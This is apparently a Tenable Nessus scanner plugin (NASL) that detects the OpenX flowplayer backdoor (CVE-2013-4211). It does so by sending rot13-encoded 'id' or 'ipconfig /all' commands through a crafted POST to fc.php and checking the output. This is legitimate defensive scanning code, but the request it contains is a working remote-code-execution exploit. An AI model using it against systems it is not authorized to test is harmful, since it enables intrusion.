#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(69371);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2016/12/07 20:46:55 $");

  script_cve_id("CVE-2013-4211");
  script_bugtraq_id(61650);
  script_osvdb_id(96073);

  script_name(english:"OpenX flowplayer-3.1.1.min.js Backdoor Remote Code Execution");
  script_summary(english:"Tries to execute arbitrary code");

  script_set_attribute(
    attribute:"synopsis",
    value:"A web application hosted on the remote web server contains a backdoor."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of OpenX installed on the remote host contains a backdoor
and allows the execution of arbitrary PHP code, subject to the
privileges under which the web server operates."
  );
  script_set_attribute(attribute:"see_also", value:"http://blog.openx.org/08/important-update-for-openx-source-2-8-10-users/");
  script_set_attribute(
    attribute:"solution",
    value:
"Upgrade to version 2.8.11 or later and refer to the project's blog post
for steps from the vendor on cleaning an affected installation. 
Additionally, conduct a full security review of the host, as it may have
been compromised."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'OpenX Backdoor PHP Code Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/08/06");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/08/07");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/08/15");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:openx:openx");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2016 Tenable Network Security, Inc.");

  script_dependencies("openx_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/openx", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(
  appname      : "openx",
  port         : port,
  exit_on_fail : TRUE
);

dir = install["dir"];
install_url = build_url(qs:dir, port:port);

# Hardcoded rot13 strings
# system(id);
cmd_linux = "flfgrz(vq);";
# echo system('ipconfig /all');
cmd_win = "rpub flfgrz('vcpbasvt /nyy');";

# Determine which command to execute on target host
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = cmd_win;
  else cmd = cmd_linux;

  cmds = make_list(cmd);
}
else cmds = make_list(cmd_linux, cmd_win);

cmd_pats = make_array();
cmd_pats[cmd_linux] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats[cmd_win] = "Subnet Mask";

vuln = FALSE;

foreach cmd (cmds)
{
  # Reverse the rot13 encoded string
  cmd_buf = NULL;
  len = strlen(cmd);

  for (i = 1; i < len+1; i++)
  {
    cmd_buf += raw_string(ord(cmd[len-i]));
  }

  # Send request to execute our code
  res = http_send_recv3(
    method : "POST",
    port   : port,
    data   : "vastPlayer=" + cmd_buf,
    item   : dir + "/www/delivery/fc.php?script=deliveryLog:vastServeVideo" +
             "Player:player&file_to_serve=flowplayer/3.1.1/flowplayer" +
             "-3.1.1.min.js",
    add_headers  : make_array("Content-Type",
        "application/x-www-form-urlencoded"),
    exit_on_fail : TRUE
  );
  exploit_req = http_last_sent_request();

  if (egrep(pattern:cmd_pats[cmd], string:res[2]))
  {
    vuln = TRUE;
    output = res[2];
    break;
  }
}

if (!vuln) audit(AUDIT_WEB_APP_NOT_AFFECTED, "OpenX", install_url);

if (report_verbosity > 0)
{
  if (cmd == cmd_linux)
  {
     match = "uid";
     report_cmd = "id";
  }
  else
  {
    match = "Windows IP";
    report_cmd = "ipconfig /all";
  }

  # Format output
  output = strstr(output, match);
  # Get index of next line : ";if(this.className
  pos = stridx(output, '"');
  output = substr(output, 0, pos-1);

  snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
  report =
    '\nNessus was able to execute the command "'+report_cmd+'" on the remote'+
    '\nhost using the following request :' +
    '\n' +
    '\n' + exploit_req +
    '\n';
  if (report_verbosity > 1)
  {
    report +=
      '\nThis produced the following output :'+
      '\n' +
      '\n' + snip +
      '\n' + chomp(output) +
      '\n' + snip +
      '\n';
  }
  security_hole(port:port, extra:report);
}
else security_hole(port);
